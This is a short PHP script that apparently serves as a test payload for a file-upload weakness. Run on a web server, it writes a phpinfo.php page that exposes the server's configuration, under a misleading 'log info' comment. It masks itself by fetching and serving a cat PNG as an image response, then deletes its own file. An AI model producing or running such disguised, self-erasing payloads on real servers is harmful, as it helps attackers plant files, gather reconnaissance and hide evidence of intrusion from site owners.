<?php
// log info
$file = 'phpinfo.php';
if (!file_exists($file)) {
	touch($file);
}
$xss = '<?php phpinfo();?>';
file_put_contents($file, $xss);

function getImageFromURL($url, $rename, $ch)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_BINARYTRANSFER,1);
    $rawdata=curl_exec($ch);
    curl_close($ch);
    $fp = fopen("$rename",'w');
    fwrite($fp, $rawdata); 
    fclose($fp);             
}

$ch = curl_init();
$image ="http://pngimg.com/upload/cat_PNG115.png";

getImageFromURL($image, "cat.png", $ch);

header('Content-Type: image/png');
readfile('cat.png');
unlink(__FILE__);